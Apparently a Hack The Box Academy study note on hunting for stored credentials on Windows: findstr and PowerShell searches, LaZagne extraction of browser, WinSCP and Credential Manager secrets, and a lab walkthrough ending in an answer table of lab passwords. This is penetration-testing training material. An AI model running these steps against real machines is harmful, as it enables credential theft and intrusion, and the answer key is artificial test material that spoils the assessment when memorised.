# 15 — Credential Hunting in Windows

## Overview

Once you have GUI or CLI access to a Windows target, **credential hunting** — systematically searching the file system and applications for stored credentials — can escalate access significantly. Tailor your search to the user's role (e.g., IT admin = likely has creds for servers, network devices, databases).

---

## Key Search Terms

```
Passwords   Passphrases   Keys        Username
User account  Creds       Users       Passkeys
configuration dbcredential dbpassword  pwd
Login       Credentials
```

---

## Search Methods

### 1. Windows Search (GUI)

Use the Start menu search bar or File Explorer search with terms like `pass`, `cred`, `password`. Searches OS settings and file system by default.

### 2. findstr (CLI)

Search for patterns across common file types:

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```
> Recursively searches (`/S`) the current directory for the literal string "password" (`/C:`) case-insensitively (`/I`) across common config and script file types. `/M` prints only matching filenames rather than every matching line.

| Flag | Purpose |
|------|---------|
| `/S` | Search subdirectories recursively |
| `/I` | Case-insensitive |
| `/M` | Print only filenames (not matching lines) |
| `/C:` | Literal search string |

### 3. LaZagne (Third-Party Tool)

Automatically extracts credentials from installed applications:

```cmd
start LaZagne.exe all
```
> Runs all LaZagne credential recovery modules. `start` opens a new window so output is visible. Use `-vv` for verbose output. Copy LaZagne to a local path first — it crashes when run from a UNC path like `\\tsclient\`.

Use `-vv` for verbose output.

| Module | Targets |
|--------|---------|
| **browsers** | Chrome, Firefox, Edge, Opera (35+ browsers) |
| **chats** | Skype and other chat apps |
| **mails** | Outlook, Thunderbird mailboxes |
| **memory** | KeePass, LSASS dumps |
| **sysadmin** | OpenVPN, WinSCP, PuTTY configs |
| **windows** | LSA secrets, Credential Manager, Vault |
| **wifi** | Saved WiFi passwords |

> **Transfer:** With xfreerdp, copy/paste LaZagne.exe into the RDP session, or use `/drive:share,/tmp/loot` to mount a shared folder.

---

## Common Credential Locations

| Location | What to Look For |
|----------|-----------------|
| SYSVOL share | Group Policy Preferences (GPP) passwords, scripts with creds |
| IT shares | Scripts, config files with hardcoded passwords |
| `web.config` files | DB connection strings on dev machines |
| `unattend.xml` | Automated install credentials |
| AD user/computer description fields | Admins sometimes store passwords here |
| KeePass databases (`.kdbx`) | Crack or guess the master password |
| User desktops/Documents | `pass.txt`, `passwords.docx`, `passwords.xlsx` |
| SharePoint | Shared credential documents |
| Browser credential stores | Chrome, Firefox, Edge saved passwords |
| WinSCP/PuTTY configs | SSH credentials in registry or config files |

---

## Attack Workflow

```
1. Assess target role (IT admin, dev, finance, etc.)
2. GUI search: Windows Search for "password", "cred", etc.
3. CLI search: findstr /SIM across common file extensions
4. Run LaZagne.exe all — extract app-stored credentials
5. Check browser saved passwords
6. Check SYSVOL, IT shares, config files
7. Check unattend.xml, web.config, KeePass DBs
8. Check AD description fields (if domain-joined)
```

---

## Key Takeaways

- Credential hunting effectiveness depends on understanding the target user's role
- `findstr /SIM /C:"password"` is the go-to CLI one-liner for file-based credential search
- LaZagne automates extraction from 35+ browsers and dozens of applications
- Browser credential stores are a goldmine — encrypted but easily decrypted with available tools
- SYSVOL GPP passwords are a classic finding (MS14-025 patched cpassword, but old GPOs may persist)
- Always check `unattend.xml`, `web.config`, and application config files

---

## Skills Assessment Walkthrough

**Target:** RDP to Windows 10 as Bob (`HTB_@cademy_stdnt!`)

```bash
xfreerdp /v:<TARGET_IP> /u:Bob /p:'HTB_@cademy_stdnt!' /dynamic-resolution /drive:share,/tmp
```
> Opens RDP and mounts `/tmp` as `\\tsclient\share\` inside the session. Use this to transfer tools like LaZagne into the session without needing a separate file server.

### Step 1: PowerShell History

```powershell
Get-Content (Get-PSReadLineOption).HistorySavePath
```
> Reads the PowerShell command history file. The path varies by user — `Get-PSReadLineOption` finds it automatically. History often reveals passwords typed directly in previous commands.

Revealed Bob's SSH usage and file paths — showed he previously accessed `passwords.txt` and ran `ssh` commands.

### Step 2: Desktop Exploration

```powershell
Get-ChildItem C:\Users\Bob\Desktop -Recurse -Force
```
> Lists all files on Bob's Desktop including hidden items (`-Force`). `-Recurse` goes into subdirectories. Look for `.txt`, `.doc`, `.xlsx`, `.ods`, and `.kdbx` files that might contain credentials.

Found:
- `WorkStuff/GitlabAccessCodeJustIncase.txt` → **GitLab access code**
- `WorkStuff/Creds/passwords.ods` → Spreadsheet with SSH switch creds and DC RDP creds

Extract `.ods` as XML (it's a ZIP):
```powershell
Copy-Item "C:\Users\Bob\Desktop\WorkStuff\Creds\passwords.ods" "C:\Users\Bob\Desktop\temp.zip"
Expand-Archive "C:\Users\Bob\Desktop\temp.zip" -DestinationPath "C:\Users\Bob\Desktop\odsextract" -Force
Get-Content "C:\Users\Bob\Desktop\odsextract\content.xml"
```
> OpenDocument Spreadsheet (`.ods`) files are ZIP archives. Rename to `.zip`, extract with `Expand-Archive`, and read `content.xml` to get the spreadsheet data as raw XML without needing LibreOffice.

### Step 3: LaZagne for WinSCP

Transfer LaZagne via RDP shared drive, copy locally, then run:

```powershell
Copy-Item "\\tsclient\share\LaZagne.exe" "C:\Users\Bob\Desktop\LaZagne.exe" -Force
.\LaZagne.exe all
```
> Copies LaZagne from the RDP shared drive to a local path, then runs it. Must copy locally first — LaZagne (PyInstaller) fails when run directly from `\\tsclient\`. Run from an elevated shell for full coverage.

> **Note:** LaZagne crashes when run from UNC paths (`\\tsclient\`). Always copy locally first.

Decrypted WinSCP stored session → **file server credentials**

### Step 4: Automation Scripts

```powershell
Get-ChildItem -Path C:\ -Include *.ps1,*.bat,*.yml,*.yaml,*.py -Recurse -Force -ErrorAction SilentlyContinue | Select-String -Pattern "password|default|router|new.user" -ErrorAction SilentlyContinue
```
> Recursively searches all script and automation files on C: for credential-related keywords. `-ErrorAction SilentlyContinue` suppresses access-denied errors. Extend the pattern with `|credential|apikey` for broader coverage.

Found:
- **Ansible playbook** with hardcoded Edge-Router credentials
- **User creation script** with default Inlanefreight domain password

### Answers

| Question | Answer | Source |
|----------|--------|--------|
| Q1 — SSH Switches password | `WellConnected123` | passwords.ods spreadsheet |
| Q2 — GitLab access code | `3z1ePfGbjWPsTfCsZfjy` | GitlabAccessCodeJustIncase.txt |
| Q3 — WinSCP file server creds | `ubuntu:FSadmin123` | LaZagne → WinSCP registry |
| Q4 — Default domain password | `InlaneFreightisGreat2022` | Automation scripts folder |
| Q5 — Edge-Router creds | `edgeadmin:Edge@dmin123!` | Ansible playbook |

### Lessons Learned

- PowerShell history (`ConsoleHost_history.txt`) is a goldmine for retracing user activity
- `.ods` files are ZIP archives — extract `content.xml` to read without LibreOffice
- LaZagne must be copied locally before running (PyInstaller fails over UNC paths)
- Automation scripts (Ansible, PowerShell) frequently contain hardcoded credentials
- Always check `Desktop`, `Documents`, and automation/scripts directories for IT admin users
